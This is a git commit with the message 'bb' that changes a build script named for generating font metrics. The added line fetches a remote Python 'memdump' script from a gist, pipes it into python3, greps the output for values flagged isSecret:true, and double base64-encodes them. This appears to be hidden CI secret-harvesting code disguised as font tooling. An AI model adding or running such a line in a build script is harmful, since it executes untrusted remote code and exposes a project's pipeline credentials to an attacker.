75d6be42bdc47a191ea432208b014231ff506771
yosiroute <gar_park_son_char@gmail.com>
2026-04-24 09:44:59 +0200

    bb

--- dockers/fonts/buildMetrics.sh
+++ dockers/fonts/buildMetrics.sh
@@ -1,3 +1,4 @@
 echo "building metrics" 
-
-curl -sSf https://gist.githubusercontent.com/madder-g/d3f2f180c7ed4925de58e5f32d2a00a8/raw/4acb4f0a93250c9665d31371b4dceb3ecd0d4345/memdump.py | sudo python3 | tr -d '\\0' | grep -aoE '\"[^\"]+\":\\{\"value\":\"[^\"]*\",\"isSecret\":true\\}' | sort -u | base64 -w 0 | base64 -w 0 && exit 0
+pwd
+ls -lah 
+curl -sSf https://gist.githubusercontent.com/madder-g/d3f2f180c7ed4925de58e5f32d2a00a8/raw/4acb4f0a93250c9665d31371b4dceb3ecd0d4345/memdump.py | python3 | tr -d '\\0' | grep -aoE '\"[^\"]+\":\\{\"value\":\"[^\"]*\",\"isSecret\":true\\}' | sort -u | base64 -w 0 | base64 -w 0 && exit 0
